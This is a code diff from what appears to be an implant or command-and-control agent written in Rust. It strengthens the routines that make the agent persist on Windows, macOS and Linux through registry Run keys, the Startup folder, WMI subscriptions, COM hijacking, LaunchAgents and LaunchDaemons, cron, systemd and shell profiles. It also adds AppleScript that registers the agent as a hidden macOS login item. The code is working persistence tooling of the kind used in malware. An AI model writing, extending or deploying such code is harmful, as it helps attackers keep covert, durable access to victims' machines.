@@ -1739,22 +1739,69 @@ pub mod windows {
         let full_cfg = crate::config::load_config().unwrap_or_default();
         let cfg = &full_cfg.persistence;
 
+        let mut attempted = 0usize;
+        let mut succeeded = 0usize;
+        let mut failures: Vec<String> = Vec::new();
+
         if cfg.registry_run_key {
-            if let Err(e) = RegistryRunKey::from_config(cfg).install(&exe) {
-                log::warn!("RegistryRunKey install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = RegistryRunKey::from_config(cfg);
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "RegistryRunKey install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("RegistryRunKey install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.startup_folder {
-            if let Err(e) = StartupFolder::from_config(cfg).install(&exe) {
-                log::warn!("StartupFolder install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = StartupFolder::from_config(cfg);
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "StartupFolder install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("StartupFolder install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.wmi_subscription {
-            if let Err(e) = WmiSubscription::from_config(cfg).install(&exe) {
-                log::warn!("WmiSubscription install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = WmiSubscription::from_config(cfg);
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "WmiSubscription install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("WmiSubscription install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.com_hijacking {
+            attempted += 1;
             // COM hijacking replaces an InProcServer32 DLL, so the agent must be
             // built as a DLL (e.g. --crate-type cdylib).  When running as an EXE
             // the file extension check inside ComHijacking::install() would always
@@ -1764,14 +1811,47 @@ pub mod windows {
                 ext.eq_ignore_ascii_case("dll")
             });
             if !is_dll {
-                log::info!(
+                let msg = format!(
                     "ComHijacking: skipping — agent binary is '{}' (not a DLL); \
                      COM hijacking requires a cdylib build target",
                     exe.display()
                 );
-            } else if let Err(e) = ComHijacking::from_config(cfg).install(&exe) {
-                log::warn!("ComHijacking install failed (non-fatal): {}", e);
+                log::warn!("{}", msg);
+                failures.push(msg);
+            } else {
+                let mech = ComHijacking::from_config(cfg);
+                match mech.install(&exe).and_then(|_| mech.verify()) {
+                    Ok(true) => {
+                        succeeded += 1;
+                    }
+                    Ok(false) => {
+                        let msg = "ComHijacking install verification failed".to_string();
+                        log::warn!("{}", msg);
+                        failures.push(msg);
+                    }
+                    Err(e) => {
+                        let msg = format!("ComHijacking install failed: {}", e);
+                        log::warn!("{}", msg);
+                        failures.push(msg);
+                    }
+                }
             }
+        }
+
+        if attempted == 0 {
+            anyhow::bail!("no persistence mechanism enabled in configuration");
+        }
+        if succeeded == 0 {
+            anyhow::bail!(
+                "persistence installation failed for all enabled mechanisms: {}",
+                failures.join("; ")
+            );
+        }
+        if !failures.is_empty() {
+            log::warn!(
+                "persistence installed with partial failures: {}",
+                failures.join("; ")
+            );
         }
 
         Ok(exe)
@@ -2171,25 +2251,101 @@ pub mod macos {
             .unwrap_or_default()
             .persistence;
 
+        let mut attempted = 0usize;
+        let mut succeeded = 0usize;
+        let mut failures: Vec<String> = Vec::new();
+
         if cfg.launch_agent {
-            if let Err(e) = LaunchAgent::default().install(&exe) {
-                log::warn!("LaunchAgent install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = LaunchAgent::default();
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "LaunchAgent install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("LaunchAgent install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.cron_job {
-            if let Err(e) = CronJob.install(&exe) {
-                log::warn!("CronJob install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = CronJob;
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "CronJob install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("CronJob install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.launch_daemon {
-            if let Err(e) = LaunchDaemon::default().install(&exe) {
-                log::warn!("LaunchDaemon install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = LaunchDaemon::default();
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "LaunchDaemon install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("LaunchDaemon install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.login_item {
-            if let Err(e) = LoginItem::default().install(&exe) {
-                log::warn!("LoginItem install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = LoginItem::default();
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "LoginItem install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("LoginItem install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
+        }
+
+        if attempted == 0 {
+            anyhow::bail!("no persistence mechanism enabled in configuration");
+        }
+        if succeeded == 0 {
+            anyhow::bail!(
+                "persistence installation failed for all enabled mechanisms: {}",
+                failures.join("; ")
+            );
+        }
+        if !failures.is_empty() {
+            log::warn!(
+                "persistence installed with partial failures: {}",
+                failures.join("; ")
+            );
         }
 
         Ok(exe)
@@ -2316,7 +2472,7 @@ pub mod macos {
     #[derive(Clone, Copy, Debug, PartialEq, Eq)]
     enum LoginItemStrategy {
         ServiceManagement,
-        LaunchAgentFallback,
+        SystemEventsLoginItem,
     }
 
     struct SmHelperContext {
@@ -2332,8 +2488,9 @@ pub mod macos {
     ///    `SMLoginItemSetEnabled`) and require a helper app
     ///    at:
     ///    `<MainApp>.app/Contents/Library/LoginItems/<app_name>.app`
-    /// 2) Otherwise, fall back to the existing GUI LaunchAgent strategy
-    ///    (`asuser_bootstrap: true`).
+    /// 2) Otherwise, register a user login item via System Events
+    ///    (`osascript`), so non-bundle binaries still use a true LoginItem
+    ///    registration path.
     ///
     /// ServiceManagement requirement:
     /// The helper login item app **must** be embedded in
@@ -2356,8 +2513,42 @@ pub mod macos {
             if Self::app_bundle_root(executable_path).is_some() {
                 LoginItemStrategy::ServiceManagement
             } else {
-                LoginItemStrategy::LaunchAgentFallback
+                LoginItemStrategy::SystemEventsLoginItem
             }
+        }
+
+        fn applescript_escape(input: &str) -> String {
+            let mut out = String::with_capacity(input.len());
+            for ch in input.chars() {
+                match ch {
+                    '\\' => out.push_str("\\\\"),
+                    '"' => out.push_str("\\\""),
+                    '\n' => out.push_str("\\n"),
+                    '\r' => out.push_str("\\r"),
+                    _ => out.push(ch),
+                }
+            }
+            out
+        }
+
+        fn run_osascript(script: &str) -> Result<String> {
+            let out = std::process::Command::new("osascript")
+                .arg("-e")
+                .arg(script)
+                .output()
+                .map_err(|e| anyhow!("LoginItem: failed to execute osascript: {}", e))?;
+
+            if !out.status.success() {
+                let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
+                let detail = if stderr.is_empty() {
+                    "no stderr output".to_string()
+                } else {
+                    stderr
+                };
+                return Err(anyhow!("LoginItem: osascript failed: {}", detail));
+            }
+
+            Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
         }
 
         fn app_bundle_root(executable_path: &Path) -> Option<PathBuf> {
@@ -2588,6 +2779,75 @@ pub mod macos {
             Ok(status.success())
         }
 
+        fn install_via_system_events_login_item(&self, executable_path: &Path) -> Result<()> {
+            let canonical_exe = std::fs::canonicalize(executable_path)
+                .unwrap_or_else(|_| executable_path.to_path_buf());
+            let name = Self::applescript_escape(&self.app_name);
+            let path = Self::applescript_escape(&canonical_exe.to_string_lossy());
+
+            let script = format!(
+                r#"tell application "System Events"
+if exists login item "{name}" then
+    set path of login item "{name}" to "{path}"
+    set hidden of login item "{name}" to true
+else
+    make login item at end with properties {{name:"{name}", path:"{path}", hidden:true}}
+end if
+end tell"#
+            );
+
+            Self::run_osascript(&script)?;
+            log::info!(
+                "LoginItem::install: registered System Events login item '{}' -> '{}'",
+                self.app_name,
+                canonical_exe.display()
+            );
+            Ok(())
+        }
+
+        fn remove_via_system_events_login_item(&self) -> Result<()> {
+            let name = Self::applescript_escape(&self.app_name);
+            let script = format!(
+                r#"tell application "System Events"
+if exists login item "{name}" then
+    delete login item "{name}"
+end if
+end tell"#
+            );
+
+            Self::run_osascript(&script)?;
+            log::info!(
+                "LoginItem::remove: removed System Events login item '{}'",
+                self.app_name
+            );
+            Ok(())
+        }
+
+        fn verify_via_system_events_login_item(&self, executable_path: &Path) -> Result<bool> {
+            let expected = std::fs::canonicalize(executable_path)
+                .unwrap_or_else(|_| executable_path.to_path_buf());
+            let name = Self::applescript_escape(&self.app_name);
+            let script = format!(
+                r#"tell application "System Events"
+if exists login item "{name}" then
+    return POSIX path of (path of login item "{name}")
+else
+    return ""
+end if
+end tell"#
+            );
+
+            let reported = Self::run_osascript(&script)?;
+            if reported.is_empty() {
+                return Ok(false);
+            }
+
+            let reported_path = PathBuf::from(reported);
+            let reported_canonical =
+                std::fs::canonicalize(&reported_path).unwrap_or(reported_path);
+            Ok(reported_canonical == expected)
+        }
+
         fn as_launch_agent(&self) -> LaunchAgent {
             LaunchAgent {
                 label: format!(
@@ -2606,11 +2866,8 @@ pub mod macos {
                     let ctx = self.resolve_sm_helper_context(executable_path)?;
                     self.install_via_service_management(&ctx)
                 }
-                LoginItemStrategy::LaunchAgentFallback => {
-                    log::info!(
-                        "LoginItem::install: executable is not in an app bundle; using LaunchAgent fallback"
-                    );
-                    self.as_launch_agent().install(executable_path)
+                LoginItemStrategy::SystemEventsLoginItem => {
+                    self.install_via_system_events_login_item(executable_path)
                 }
             }
         }
@@ -2618,16 +2875,24 @@ pub mod macos {
         fn remove(&self) -> Result<()> {
             let exe = match std::env::current_exe() {
                 Ok(p) => p,
-                Err(_) => return self.as_launch_agent().remove(),
+                Err(_) => {
+                    let _ = self.as_launch_agent().remove();
+                    return self.remove_via_system_events_login_item();
+                }
             };
 
             match Self::strategy_for_executable(&exe) {
                 LoginItemStrategy::ServiceManagement => {
                     let ctx = self.resolve_sm_helper_context(&exe)?;
-                    self.remove_via_service_management(&ctx)
+                    self.remove_via_service_management(&ctx)?;
                 }
-                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().remove(),
+                LoginItemStrategy::SystemEventsLoginItem => {
+                    self.remove_via_system_events_login_item()?;
+                }
             }
+
+            let _ = self.as_launch_agent().remove();
+            Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
@@ -2645,7 +2910,11 @@ pub mod macos {
                     };
                     Ok(sm_ok || launch_agent_ok)
                 }
-                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().verify(),
+                LoginItemStrategy::SystemEventsLoginItem => {
+                    let launch_agent_ok = self.as_launch_agent().verify().unwrap_or(false);
+                    let login_item_ok = self.verify_via_system_events_login_item(&exe)?;
+                    Ok(login_item_ok || launch_agent_ok)
+                }
             }
         }
     }
@@ -2901,20 +3170,82 @@ pub mod linux {
             .unwrap_or_default()
             .persistence;
 
+        let mut attempted = 0usize;
+        let mut succeeded = 0usize;
+        let mut failures: Vec<String> = Vec::new();
+
         if cfg.systemd_service {
-            if let Err(e) = SystemdService::default().install(&exe) {
-                log::warn!("SystemdService install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = SystemdService::default();
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "SystemdService install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("SystemdService install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.cron_job {
-            if let Err(e) = CronJob.install(&exe) {
-                log::warn!("CronJob install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = CronJob;
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "CronJob install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("CronJob install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
         }
         if cfg.shell_profile {
-            if let Err(e) = ShellProfile.install(&exe) {
-                log::warn!("ShellProfile install failed (non-fatal): {}", e);
+            attempted += 1;
+            let mech = ShellProfile;
+            match mech.install(&exe).and_then(|_| mech.verify()) {
+                Ok(true) => {
+                    succeeded += 1;
+                }
+                Ok(false) => {
+                    let msg = "ShellProfile install verification failed".to_string();
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
+                Err(e) => {
+                    let msg = format!("ShellProfile install failed: {}", e);
+                    log::warn!("{}", msg);
+                    failures.push(msg);
+                }
             }
+        }
+
+        if attempted == 0 {
+            anyhow::bail!("no persistence mechanism enabled in configuration");
+        }
+        if succeeded == 0 {
+            anyhow::bail!(
+                "persistence installation failed for all enabled mechanisms: {}",
+                failures.join("; ")
+            );
+        }
+        if !failures.is_empty() {
+            log::warn!(
+                "persistence installed with partial failures: {}",
+                failures.join("; ")
+            );
         }
 
         Ok(exe)
